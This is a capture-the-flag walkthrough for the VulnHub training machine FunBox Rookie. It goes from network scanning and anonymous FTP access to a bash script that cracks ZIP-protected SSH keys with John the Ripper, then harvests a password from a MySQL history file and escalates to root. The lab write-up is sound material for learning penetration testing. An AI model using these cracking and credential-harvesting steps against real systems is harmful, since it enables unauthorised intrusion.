
# FunBox #2 - CTF

Available on VulnHub: https://www.vulnhub.com/entry/funbox-rookie,520/


## Walkthrough

### IP Discovery

```
$ sudo netdiscover -r 192.168.1.0/16
```

```
Currently scanning: Finished!   |   Screen View: Unique Hosts

0 Captured ARP Req/Rep packets, from 0 hosts.   Total size: 0
_____________________________________________________________________________
 IP            At MAC Address     Count     Len  MAC Vendor / Hostname
-----------------------------------------------------------------------------
xxx.xxx.x.x     xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxx
xxx.xxx.x.xxx   xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
xxx.xxx.x.xxx   xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
192.168.1.198   08:00:27:24:e5:9d      1      xx  PCS Systemtechnik GmbH
xxx.xxx.x.xxx   xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
xxx.xxx.x.xxx   xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
xxx.xxx.x.xxx   xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
xxx.xxx.x.xxx   xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
```

### Port Scanning

```
$ nmap -AT4 -p- 192.168.1.198
```

```
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-11 11:50 EDT
Nmap scan report for 192.168.1.198
Host is up (0.00073s latency).
Not shown: 65532 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     ProFTPD 1.3.5e
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-rw-r--   1 ftp      ftp          1477 Jul 25 10:51 anna.zip
| -rw-rw-r--   1 ftp      ftp          1477 Jul 25 10:50 ariel.zip
| -rw-rw-r--   1 ftp      ftp          1477 Jul 25 10:52 bud.zip
| -rw-rw-r--   1 ftp      ftp          1477 Jul 25 10:58 cathrine.zip
| -rw-rw-r--   1 ftp      ftp          1477 Jul 25 10:51 homer.zip
| -rw-rw-r--   1 ftp      ftp          1477 Jul 25 10:51 jessica.zip
| -rw-rw-r--   1 ftp      ftp          1477 Jul 25 10:50 john.zip
| -rw-rw-r--   1 ftp      ftp          1477 Jul 25 10:51 marge.zip
| -rw-rw-r--   1 ftp      ftp          1477 Jul 25 10:50 miriam.zip
| -r--r--r--   1 ftp      ftp          1477 Jul 25 10:44 tom.zip
| -rw-r--r--   1 ftp      ftp           170 Jan 10  2018 welcome.msg
|_-rw-rw-r--   1 ftp      ftp          1477 Jul 25 10:51 zlatan.zip
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 f9:46:7d:fe:0c:4d:a9:7e:2d:77:74:0f:a2:51:72:51 (RSA)
|   256 15:00:46:67:80:9b:40:12:3a:0c:66:07:db:1d:18:47 (ECDSA)
|_  256 75:ba:66:95:bb:0f:16:de:7e:7e:a1:7b:27:3b:b0:58 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-robots.txt: 1 disallowed entry
|_/logs/
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.58 seconds
```

### FTP Anonymous Access

```
$ ftp 192.168.1.198

Connected to 192.168.1.198.
220 ProFTPD 1.3.5e Server (Debian) [::ffff:192.168.1.198]
Name (192.168.1.198:kali): anonymous
331 Anonymous login ok, send your complete email address as your password
Password: anonymous
230-Welcome, archive user anonymous@192.168.1.102 !
230-
230-The local time is: Sun Oct 11 16:08:56 2020
230-
230-This is an experimental FTP server.  If you have any unusual problems,
230-please report them via e-mail to <root@funbox2>.
230-
230 Anonymous access granted, restrictions apply
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -lah
200 PORT command successful
150 Opening ASCII mode data connection for file list
drwxr-xr-x   2 ftp      ftp          4.0k Jul 25 11:07 .
drwxr-xr-x   2 ftp      ftp          4.0k Jul 25 11:07 ..
-rw-r--r--   1 ftp      ftp           153 Jul 25 11:06 .@admins
-rw-rw-r--   1 ftp      ftp          1.4k Jul 25 10:51 anna.zip
-rw-rw-r--   1 ftp      ftp          1.4k Jul 25 10:50 ariel.zip
-rw-rw-r--   1 ftp      ftp          1.4k Jul 25 10:52 bud.zip
-rw-rw-r--   1 ftp      ftp          1.4k Jul 25 10:58 cathrine.zip
-rw-rw-r--   1 ftp      ftp          1.4k Jul 25 10:51 homer.zip
-rw-rw-r--   1 ftp      ftp          1.4k Jul 25 10:51 jessica.zip
-rw-rw-r--   1 ftp      ftp          1.4k Jul 25 10:50 john.zip
-rw-rw-r--   1 ftp      ftp          1.4k Jul 25 10:51 marge.zip
-rw-rw-r--   1 ftp      ftp          1.4k Jul 25 10:50 miriam.zip
-r--r--r--   1 ftp      ftp          1.4k Jul 25 10:44 tom.zip
-rw-r--r--   1 ftp      ftp           114 Jul 25 11:07 .@users
-rw-r--r--   1 ftp      ftp           170 Jan 10  2018 welcome.msg
-rw-rw-r--   1 ftp      ftp          1.4k Jul 25 10:51 zlatan.zip
226 Transfer complete
```

### Cracking ZIP Passwords

I made a simple script to automate the password cracking for all users.
```
$ cat crack.sh

#!/bin/bash

for file in ./*.zip
do
	echo "###########################################################################################"
	echo "Extracting hash of $file"
	zip2john $file > ${file}.hash
	echo ""

	echo "Cracking password of $file"
	john --wordlist='/usr/share/wordlists/rockyou.txt' ${file}.hash

	echo ""
	john --show ${file}.hash
	rm ${file}.hash
	echo ""
done

echo "###########################################################################################"
```

Running crack.sh
```
$ ./crack.sh

###########################################################################################
Extracting hash of ./anna.zip
ver 2.0 efh 5455 efh 7875 anna.zip/id_rsa PKZIP Encr: 2b chk, TS_chk, cmplen=1299, decmplen=1675, crc=39C551E6

Cracking password of ./anna.zip
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:01 DONE (2020-10-11 13:01) 0g/s 8289Kp/s 8289Kc/s 8289KC/s !!rebound!!..*7¡Vamos!
Session completed

0 password hashes cracked, 1 left

###########################################################################################
Extracting hash of ./ariel.zip
ver 2.0 efh 5455 efh 7875 ariel.zip/id_rsa PKZIP Encr: 2b chk, TS_chk, cmplen=1299, decmplen=1675, crc=39C551E6

Cracking password of ./ariel.zip
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:01 DONE (2020-10-11 13:01) 0g/s 8102Kp/s 8102Kc/s 8102KC/s !!rebound!!..*7¡Vamos!
Session completed

0 password hashes cracked, 1 left

###########################################################################################
Extracting hash of ./bud.zip
ver 2.0 efh 5455 efh 7875 bud.zip/id_rsa PKZIP Encr: 2b chk, TS_chk, cmplen=1299, decmplen=1675, crc=39C551E6

Cracking password of ./bud.zip
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:01 DONE (2020-10-11 13:01) 0g/s 8386Kp/s 8386Kc/s 8386KC/s !!rebound!!..*7¡Vamos!
Session completed

0 password hashes cracked, 1 left

###########################################################################################
Extracting hash of ./cathrine.zip
ver 2.0 efh 5455 efh 7875 cathrine.zip/id_rsa PKZIP Encr: 2b chk, TS_chk, cmplen=1299, decmplen=1675, crc=39C551E6

Cracking password of ./cathrine.zip
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
No password hashes left to crack (see FAQ)

cathrine.zip/id_rsa:catwoman:id_rsa:cathrine.zip::./cathrine.zip

1 password hash cracked, 0 left

###########################################################################################
Extracting hash of ./homer.zip
ver 2.0 efh 5455 efh 7875 homer.zip/id_rsa PKZIP Encr: 2b chk, TS_chk, cmplen=1299, decmplen=1675, crc=39C551E6

Cracking password of ./homer.zip
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:01 DONE (2020-10-11 13:01) 0g/s 8102Kp/s 8102Kc/s 8102KC/s !!rebound!!..*7¡Vamos!
Session completed

0 password hashes cracked, 1 left

###########################################################################################
Extracting hash of ./jessica.zip
ver 2.0 efh 5455 efh 7875 jessica.zip/id_rsa PKZIP Encr: 2b chk, TS_chk, cmplen=1299, decmplen=1675, crc=39C551E6

Cracking password of ./jessica.zip
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:01 DONE (2020-10-11 13:01) 0g/s 7879Kp/s 7879Kc/s 7879KC/s !!rebound!!..*7¡Vamos!
Session completed

0 password hashes cracked, 1 left

###########################################################################################
Extracting hash of ./john.zip
ver 2.0 efh 5455 efh 7875 john.zip/id_rsa PKZIP Encr: 2b chk, TS_chk, cmplen=1299, decmplen=1675, crc=39C551E6

Cracking password of ./john.zip
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:01 DONE (2020-10-11 13:01) 0g/s 7923Kp/s 7923Kc/s 7923KC/s !!rebound!!..*7¡Vamos!
Session completed

0 password hashes cracked, 1 left

###########################################################################################
Extracting hash of ./marge.zip
ver 2.0 efh 5455 efh 7875 marge.zip/id_rsa PKZIP Encr: 2b chk, TS_chk, cmplen=1299, decmplen=1675, crc=39C551E6

Cracking password of ./marge.zip
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:02 DONE (2020-10-11 13:01) 0g/s 6578Kp/s 6578Kc/s 6578KC/s !!rebound!!..*7¡Vamos!
Session completed

0 password hashes cracked, 1 left

###########################################################################################
Extracting hash of ./miriam.zip
ver 2.0 efh 5455 efh 7875 miriam.zip/id_rsa PKZIP Encr: 2b chk, TS_chk, cmplen=1299, decmplen=1675, crc=39C551E6

Cracking password of ./miriam.zip
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:01 DONE (2020-10-11 13:01) 0g/s 8436Kp/s 8436Kc/s 8436KC/s !!rebound!!..*7¡Vamos!
Session completed

0 password hashes cracked, 1 left

###########################################################################################
Extracting hash of ./tom.zip
ver 2.0 efh 5455 efh 7875 tom.zip/id_rsa PKZIP Encr: 2b chk, TS_chk, cmplen=1299, decmplen=1675, crc=39C551E6

Cracking password of ./tom.zip
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
No password hashes left to crack (see FAQ)

tom.zip/id_rsa:iubire:id_rsa:tom.zip::./tom.zip

1 password hash cracked, 0 left

###########################################################################################
Extracting hash of ./zlatan.zip
ver 2.0 efh 5455 efh 7875 zlatan.zip/id_rsa PKZIP Encr: 2b chk, TS_chk, cmplen=1299, decmplen=1675, crc=39C551E6

Cracking password of ./zlatan.zip
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:01 DONE (2020-10-11 13:02) 0g/s 8148Kp/s 8148Kc/s 8148KC/s !!rebound!!..*7¡Vamos!
Session completed

0 password hashes cracked, 1 left

###########################################################################################
```

Cracked Credentials:

* **cathrine** : **catwoman**
* **tom** : **iubire**

### SSH Access

```
$ ssh -i ./tom_id_rsa tom@192.168.1.198

load pubkey "./tom_id_rsa": invalid format
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-112-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun Oct 11 17:06:13 UTC 2020

  System load:  0.0               Processes:             104
  Usage of /:   75.9% of 4.37GB   Users logged in:       0
  Memory usage: 36%               IP address for enp0s3: 192.168.1.198
  Swap usage:   0%

 * Kubernetes 1.19 is out! Get it in one command with:

     sudo snap install microk8s --channel=1.19 --classic

   https://microk8s.io/ has docs and details.

32 packages can be updated.
0 updates are security updates.

New release '20.04.1 LTS' available.
Run 'do-release-upgrade' to upgrade to it.


*** System restart required ***
Last login: Sun Oct 11 17:06:03 2020 from 192.168.1.102

tom@funbox2:~$ id
uid=1000(tom) gid=1000(tom) groups=1000(tom),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
```

### Acquiring Tom's Password

```
tom@funbox2:~$ cat .mysql_history

_HiStOrY_V2_
show\040databases;
quit
create\040database\040'support';
create\040database\040support;
use\040support
create\040table\040users;
show\040tables
;
select\040*\040from\040support
;
show\040tables;
select\040*\040from\040support;
insert\040into\040support\040(tom,\040xx11yy22!);
quit
```

Credentials: **tom** : **xx11yy22!**

### Privilege Escalation

Tom has superuser credentials
```
tom@funbox2:~$ su -
Password: xx11yy22!

root@funbox2:~#
```

### Flag Acquiring

```
root@funbox2:~# cat flag.txt
   ____  __  __   _  __   ___   ____    _  __             ___
  / __/ / / / /  / |/ /  / _ ) / __ \  | |/_/            |_  |
 / _/  / /_/ /  /    /  / _  |/ /_/ / _>  <             / __/
/_/    \____/  /_/|_/  /____/ \____/ /_/|_|       __   /____/
           ____ ___  ___  / /_ ___  ___/ /       / /
 _  _  _  / __// _ \/ _ \/ __// -_)/ _  /       /_/
(_)(_)(_)/_/   \___/\___/\__/ \__/ \_,_/       (_)

from @0815R2d2 with ♥
```

